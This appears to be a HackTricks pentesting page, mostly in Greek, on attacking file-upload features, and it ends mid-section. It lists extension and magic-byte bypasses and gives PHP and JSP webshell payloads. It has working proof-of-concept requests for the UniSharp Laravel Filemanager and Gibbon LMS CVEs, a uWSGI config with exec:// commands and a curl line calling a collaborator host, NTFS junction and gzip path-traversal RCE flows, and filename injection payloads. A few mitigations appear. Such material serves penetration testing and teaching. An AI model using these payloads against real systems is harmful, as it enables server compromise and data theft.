# Μεταφόρτωση Αρχείων

{{#include ../../banners/hacktricks-training.md}}

## Γενική Μεθοδολογία Μεταφόρτωσης Αρχείων

Άλλες χρήσιμες επεκτάσεις:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Παράκαμψη ελέγχων επεκτάσεων αρχείων

1. Αν εφαρμόζονται, **ελέγξτε** τις **προηγούμενες επεκτάσεις.** Δοκιμάστε επίσης με **κεφαλαία/μικρά γράμματα**: _pHp, .pHP5, .PhAr ..._
2. _Δοκιμάστε να **προσθέσετε μια έγκυρη επέκταση πριν** την εκτελέσιμη επέκταση (χρησιμοποιήστε και τις προηγούμενες επεκτάσεις):_
- _file.png.php_
- _file.png.Php5_
3. Δοκιμάστε να προσθέσετε **ειδικούς χαρακτήρες στο τέλος.** Μπορείτε να χρησιμοποιήσετε το Burp για να **bruteforce** όλους τους **ascii** και **Unicode** χαρακτήρες. (_Σημειώστε ότι μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε τις **προηγουμένως** αναφερθείσες **επεκτάσεις**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Προσπαθήστε να παρακάμψετε τις προστασίες **ξεγελώντας τον παράσιτο-επεκτασιο-αναλυτή** στο server-side με τεχνικές όπως **διπλασιασμός** της **επέκτασης** ή **προσθήκη junk δεδομένων** (bytes **null**) μεταξύ επεκτάσεων. _Μπορείτε επίσης να χρησιμοποιήσετε τις **προηγούμενες επεκτάσεις** για να φτιάξετε καλύτερο payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Προσθέστε **άλλη μια στρώση επεκτάσεων** στις προηγούμενες δοκιμές:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Δοκιμάστε να βάλετε την **εκτελέσιμη επέκταση πριν** την έγκυρη επέκταση και ελπίζετε ότι ο server είναι λάθος ρυθμισμένος. (χρήσιμο για εκμετάλλευση λανθασμένων ρυθμίσεων Apache όπου οτιδήποτε με επέκταση **.php**, αλλά **δεν χρειάζεται απαραίτητα να τελειώνει σε .php**, θα εκτελέσει κώδικα):
- _ex: file.php.png_
7. Χρήση **NTFS alternate data stream (ADS)** στα **Windows**. Σε αυτή την περίπτωση, ένας χαρακτήρας άνω-κάτω-τελείας ":" θα εισαχθεί μετά από μια απαγορευμένη επέκταση και πριν από μια επιτρεπόμενη. Ως αποτέλεσμα, θα δημιουργηθεί ένα **κενό αρχείο με την απαγορευμένη επέκταση** στον server (π.χ. "file.asax:.jpg"). Αυτό το αρχείο μπορεί να επεξεργαστεί αργότερα με άλλες τεχνικές όπως χρήση του short filename. Το pattern "**::$data**” μπορεί επίσης να χρησιμοποιηθεί για να δημιουργήσει μη-κενά αρχεία. Επομένως, η προσθήκη μιας τελείας μετά από αυτό το pattern μπορεί να είναι χρήσιμη για περαιτέρω παράκαμψη περιορισμών (π.χ. "file.asp::$data.")
8. Προσπαθήστε να σπάσετε τα όρια του ονόματος αρχείου. Η έγκυρη επέκταση κόβεται και το κακόβουλο PHP μένει. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Κάποιοι handlers μεταφόρτωσης κόβουν ή κανονικοποιούν τους τελεστές τελείας στο τέλος του αποθηκευμένου ονόματος αρχείου. Στο UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) πριν την έκδοση 2.9.1, μπορείτε να παρακάμψετε τον έλεγχο επεκτάσεων με:

- Χρήση έγκυρου image MIME και magic header (π.χ. το PNG `\x89PNG\r\n\x1a\n`).
- Ονομάζοντας το αρχείο που ανεβάζετε με επέκταση PHP ακολουθούμενη από τελεία, π.χ. `shell.php.`.
- Ο server αφαιρεί την τελεία στο τέλος και αποθηκεύει `shell.php`, το οποίο θα εκτελεστεί εάν τοποθετηθεί σε μια web-served διαδρομή (προεπιλεγμένη δημόσια αποθήκευση όπως το `/storage/files/`).

Ελάχιστο PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Στη συνέχεια πρόσβασε την αποθηκευμένη διαδρομή (τυπικό σε Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Μέτρα αντιμετώπισης:
- Αναβαθμίστε unisharp/laravel-filemanager σε ≥ 2.9.1.
- Επιβάλετε αυστηρές server-side λίστες επιτρεπόμενων και επαληθεύστε εκ νέου το αποθηκευμένο όνομα αρχείου.
- Φιλοξενείστε τα uploads σε μη εκτελέσιμες τοποθεσίες.

### Παράκαμψη Content-Type, Magic Number, Compression & Resizing

- Παρακάμψτε τους ελέγχους **Content-Type** θέτοντας την **τιμή** της **κεφαλίδας** **Content-Type** σε: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Παρακάμψτε τον έλεγχο **magic number** προσθέτοντας στην αρχή του αρχείου τα **bytes μιας πραγματικής εικόνας** (μπερδεύοντας την εντολή _file_). Ή εισάγετε το shell μέσα στα **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Αν στην εικόνα σας προστίθεται **συμπίεση**, για παράδειγμα χρησιμοποιώντας κάποιες τυπικές βιβλιοθήκες PHP όπως [PHP-GD](https://www.php.net/manual/fr/book.image.php), οι προηγούμενες τεχνικές δεν θα είναι χρήσιμες. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κάποιο κείμενο που θα **αντέξει στη συμπίεση**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Η ιστοσελίδα μπορεί επίσης να **αναδιαστάζει** την **εικόνα**, χρησιμοποιώντας για παράδειγμα τις συναρτήσεις PHP-GD `imagecopyresized` ή `imagecopyresampled`. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **αντέξει στη συμπίεση**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Μια άλλη τεχνική για να φτιάξετε ένα payload που **αντέχει στην αλλαγή μεγέθους εικόνας**, χρησιμοποιώντας τη συνάρτηση PHP-GD `thumbnailImage`. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κάποιο κείμενο που θα **αντέξει στη συμπίεση**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Άλλα κόλπα για να δοκιμάσετε

- Βρείτε μια ευπάθεια για να **μετονομάσετε** το αρχείο που έχει ήδη ανέβει (για να αλλάξετε την επέκταση).
- Βρείτε μια ευπάθεια **Local File Inclusion** για να εκτελέσετε την backdoor.
- **Πιθανή αποκάλυψη πληροφοριών**:
1. Ανεβάστε **πολλές φορές** (και **ταυτόχρονα**) το **ίδιο αρχείο** με το **ίδιο όνομα**
2. Ανεβάστε ένα αρχείο με το **όνομα** ενός **αρχείου** ή **φακέλου** που **υπάρχει ήδη**
3. Ανεβάζοντας ένα αρχείο με **"." , "..", or "…" as its name**. Για παράδειγμα, σε Apache σε **Windows**, αν η εφαρμογή αποθηκεύει τα ανεβασμένα αρχεία στον κατάλογο "/www/uploads/" directory, το "." filename will create a file called
uploads” in the "/www/" directory.
4. Ανεβάστε ένα αρχείο που ίσως δεν διαγράφεται εύκολα όπως **"…:.jpg"** σε **NTFS**. (Windows)
5. Ανεβάστε ένα αρχείο σε **Windows** με **μη έγκυρους χαρακτήρες** όπως `|<>*?”` στο όνομά του. (Windows)
6. Ανεβάστε ένα αρχείο σε **Windows** χρησιμοποιώντας **reserved** (**forbidden**) **names** όπως CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Δοκιμάστε επίσης να **ανεβάσετε ένα εκτελέσιμο** (.exe) ή ένα **.html** (λιγότερο ύποπτο) που **θα εκτελέσει κώδικα** όταν ανοιχτεί κατά λάθος από το θύμα.

### Ειδικά κόλπα επεκτάσεων

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

Εάν μπορείτε να ανεβάσετε ένα XML αρχείο σε έναν Jetty server μπορείτε να αποκτήσετε [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Έτσι, όπως αναφέρεται στην παρακάτω εικόνα, ανεβάστε το XML αρχείο στο `$JETTY_BASE/webapps/` και περιμένετε το shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Η εκτέλεση του payload συμβαίνει κατά την ανάλυση του αρχείου ρύθμισης. Για να ενεργοποιηθεί και να αναλυθεί η ρύθμιση, η διαδικασία uWSGI πρέπει είτε να επανεκκινηθεί (πιθανώς μετά από ένα crash ή εξαιτίας μιας Denial of Service επίθεσης) είτε το αρχείο να ρυθμιστεί σε auto-reload. Η δυνατότητα auto-reload, αν είναι ενεργοποιημένη, επαναφορτώνει το αρχείο σε καθορισμένα διαστήματα όταν εντοπίζει αλλαγές.

Είναι κρίσιμο να κατανοήσουμε την επιπόλαια φύση της ανάλυσης του αρχείου ρυθμίσεων του uWSGI. Συγκεκριμένα, το payload που συζητήθηκε μπορεί να εισαχθεί μέσα σε ένα δυαδικό αρχείο (όπως μια εικόνα ή PDF), διευρύνοντας περαιτέρω το εύρος πιθανής εκμετάλλευσης.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Μέθοδος: POST
- Απαιτούμενες παράμετροι:
- `img`: data-URI-like string: `[mime];[name],[base64]` (ο server αγνοεί το type/name, κάνει base64-decode το tail)
- `path`: destination filename relative to Gibbon install dir (π.χ., `poc.php` ή `0xdf.php`)
- `gibbonPersonID`: οποιαδήποτε μη-κενή τιμή γίνεται αποδεκτή (π.χ., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Αποθέστε ένα ελάχιστο webshell και εκτελέστε εντολές:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Σημειώσεις:
- Ο handler εκτελεί `base64_decode($_POST["img"])` μετά το splitting με `;` και `,`, και στη συνέχεια γράφει bytes στο `$absolutePath . '/' . $_POST['path']` χωρίς να ελέγχει την επέκταση/τύπο.
- Ο παραγόμενος κώδικας εκτελείται ως ο χρήστης της web υπηρεσίας (π.χ., XAMPP Apache on Windows).

Αναφορές για αυτό το bug περιλαμβάνουν το usd HeroLab advisory και την καταχώριση στο NVD. Δείτε την ενότητα References παρακάτω.

## **wget File Upload/SSRF Trick**

Σε ορισμένες περιπτώσεις μπορεί να διαπιστώσετε ότι ένας server χρησιμοποιεί **`wget`** για να **κατεβάσει αρχεία** και μπορείτε να **υποδείξετε** το **URL**. Σε αυτές τις περιπτώσεις, ο κώδικας μπορεί να ελέγχει ότι η επέκταση των αρχείων προς λήψη βρίσκεται σε μια whitelist για να διασφαλίσει ότι μόνο επιτρεπτά αρχεία θα κατεβούν. Ωστόσο, **αυτός ο έλεγχος μπορεί να παρακαμφθεί.**\
Το **μέγιστο** μήκος ενός **όνομα αρχείου** σε **linux** είναι **255**, ωστόσο, το **wget** περικόπτει τα ονόματα αρχείων σε **236** χαρακτήρες. Μπορείτε να **κατεβάσετε ένα αρχείο με όνομα "A"*232+".php"+".gif"**, αυτό το **όνομα αρχείου** θα **παρακάμψει** τον **έλεγχο** (όπως στο παράδειγμα **".gif"** είναι μια **έγκυρη** επέκταση) αλλά `wget` θα **μετονομάσει** το αρχείο σε **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Σημειώστε ότι **άλλη επιλογή** που ίσως σκέφτεστε για να παρακάμψετε αυτόν τον έλεγχο είναι να κάνετε τον **HTTP server να ανακατευθύνει σε διαφορετικό αρχείο**, έτσι το αρχικό URL θα παρακάμψει τον έλεγχο και στη συνέχεια το wget θα κατεβάσει το ανακατευθυνόμενο αρχείο με το νέο όνομα. Αυτό **δεν θα λειτουργήσει** **εκτός αν** wget χρησιμοποιείται με την **παράμετρο** `--trust-server-names` επειδή **το wget θα κατεβάσει τη σελίδα ανακατεύθυνσης με το όνομα του αρχείου που αναφέρεται στο αρχικό URL**.

### Απόδραση του upload directory μέσω NTFS junctions (Windows)

(Για αυτή την επίθεση θα χρειαστείτε τοπική πρόσβαση στη μηχανή Windows) Όταν τα uploads αποθηκεύονται σε υποφακέλους ανά χρήστη στα Windows (π.χ., C:\Windows\Tasks\Uploads\<id>\) και ελέγχετε τη δημιουργία/διαγραφή αυτού του υποφακέλου, μπορείτε να τον αντικαταστήσετε με ένα directory junction που δείχνει σε μια ευαίσθητη τοποθεσία (π.χ., το webroot). Τα επόμενα uploads θα γράφονται στο target path, επιτρέποντας code execution εάν ο target ερμηνεύει server‑side code.

Παράδειγμα ροής για να ανακατευθύνετε τα uploads στο XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J creates an NTFS directory junction (reparse point). The web server’s account must follow the junction and have write permission in the destination.
- This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.
- Defenses: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Ορισμένοι upload/ingest handlers γράφουν το raw request body σε ένα filesystem path που κατασκευάζεται από user-controlled query parameters. Εάν ο handler υποστηρίζει επίσης Content-Encoding: gzip και αποτυγχάνει να κανονικοποιήσει/επικυρώσει το destination path, μπορείτε να συνδυάσετε directory traversal με ένα gzipped payload για να γράψετε αυθαίρετα bytes σε έναν web-served κατάλογο και να αποκτήσετε RCE (π.χ., drop a JSP under Tomcat’s webapps).

Generic exploitation flow:
- Prepare your server-side payload (e.g., minimal JSP webshell) and gzip-compress the bytes.
- Send a POST where a path parameter (e.g., token) contains traversal escaping the intended folder, and file indicates the filename to persist. Set Content-Type: application/octet-stream and Content-Encoding: gzip; the body is the compressed payload.
- Browse to the written file to trigger execution.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Στη συνέχεια ενεργοποίησε:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Σημειώσεις
- Οι στοχευόμενες διαδρομές ποικίλλουν ανά εγκατάσταση (π.χ., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ σε ορισμένα stacks). Οποιοσδήποτε φάκελος εκτεθειμένος στο web που εκτελεί JSP θα λειτουργήσει.
- Η επέκταση Hackvertor του Burp Suite μπορεί να παράγει ένα σωστό gzip body από το payload σας.
- Πρόκειται για ένα καθαρό pre-auth arbitrary file write → RCE pattern· δεν βασίζεται σε multipart parsing.

Μέτρα μετριασμού
- Προσδιορίζετε τους προορισμούς upload server-side· μην εμπιστεύεστε ποτέ τμήματα διαδρομής από τους πελάτες.
- Κανoνικοποιήστε και επιβάλετε ώστε η επιλυθείσα διαδρομή να παραμένει εντός ενός allow-listed βασικού καταλόγου.
- Αποθηκεύετε τα uploads σε μη-εκτελέσιμο volume και απορρίπτετε την εκτέλεση script από εγγράψιμες διαδρομές.

## Εργαλεία

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) είναι ένα ισχυρό εργαλείο σχεδιασμένο να βοηθάει Pentesters και Bug Hunters στο testing μηχανισμών file upload. Εκμεταλλεύεται διάφορες bug bounty τεχνικές για να απλοποιήσει τη διαδικασία εντοπισμού και εκμετάλλευσης ευπαθειών, διασφαλίζοντας πλήρεις αξιολογήσεις web εφαρμογών.

### Διαφθορά δεικτών upload με ιδιορρυθμίες snprintf (ιστορικά)

Κάποιοι legacy upload handlers που χρησιμοποιούν `snprintf()` ή παρόμοια για να κατασκευάζουν multi-file arrays από ένα single-file upload μπορούν να εξαπατηθούν ώστε να πλαστογραφήσουν τη δομή `_FILES`. Λόγω ασυνεπειών και truncation στη συμπεριφορά του `snprintf()`, ένα προσεκτικά κατασκευασμένο single upload μπορεί να εμφανιστεί ως πολλαπλά αρχεία με δείκτες στην πλευρά του server, μπερδεύοντας λογική που υποθέτει ένα αυστηρό σχήμα (π.χ., θεωρώντας το ως multi-file upload και παίρνοντας unsafe branches). Αν και σήμερα είναι niche, αυτό το μοτίβο “index corruption” εμφανίζεται περιστασιακά ξανά σε CTFs και παλαιότερες codebases.

## Από το File upload σε άλλες ευπάθειες

- Θέστε το **filename** σε `../../../tmp/lol.png` και προσπαθήστε να εκμεταλλευτείτε **path traversal**
- Θέστε το **filename** σε `sleep(10)-- -.jpg` και ίσως καταφέρετε **SQL injection**
- Θέστε το **filename** σε `<svg onload=alert(document.domain)>` για να πετύχετε XSS
- Θέστε το **filename** σε `; sleep 10;` για να δοκιμάσετε κάποια command injection (περισσότερα [command injections tricks εδώ](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Δοκιμάστε **διαφορετικά svg payloads** από [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Εάν μπορείτε να **υποδείξετε στον web server να τραβήξει μια εικόνα από ένα URL** μπορείτε να προσπαθήσετε να εκμεταλλευτείτε ένα [SSRF](../ssrf-server-side-request-forgery/index.html). Εάν αυτή η **image** πρόκειται να **αποθηκευτεί** σε κάποια **public** τοποθεσία, μπορείτε επίσης να υποδείξετε ένα URL από [https://iplogger.org/invisible/](https://iplogger.org/invisible/) και να **κλέψετε πληροφορίες κάθε επισκέπτη**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Ειδικά κατασκευασμένα PDFs για XSS: Η [παρακάτω σελίδα παρουσιάζει πώς να **εισάγετε δεδομένα PDF για να αποκτήσετε JS execution**](../xss-cross-site-scripting/pdf-injection.md). Εάν μπορείτε να ανεβάσετε PDFs μπορείτε να ετοιμάσετε κάποιο PDF που θα εκτελέσει arbitrary JS ακολουθώντας τις δοθείσες οδηγίες.
- Ανεβάστε το \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) περιεχόμενο για να ελέγξετε αν ο server έχει κάποιο **antivirus**
- Ελέγξτε αν υπάρχει κάποιο **size limit** κατά το ανέβασμα αρχείων

Ορίστε μια λίστα top 10 πραγμάτων που μπορείτε να πετύχετε ανεβάζοντας αρχεία (από [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Μαγικά Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Ανατρέξτε στο [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) για άλλα filetypes.

## Zip/Tar File Automatically decompressed Upload

Αν μπορείτε να ανεβάσετε ένα ZIP που πρόκειται να αποσυμπιεστεί μέσα στο server, μπορείτε να κάνετε 2 πράγματα:

### Symlink

Ανεβάστε ένα archive που περιέχει soft links προς άλλα αρχεία, και μετά, αποκτώντας πρόσβαση στα αποσυμπιεσμένα αρχεία θα αποκτήσετε πρόσβαση στα συνδεδεμένα αρχεία:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Αποσυμπίεση σε διαφορετικούς φακέλους

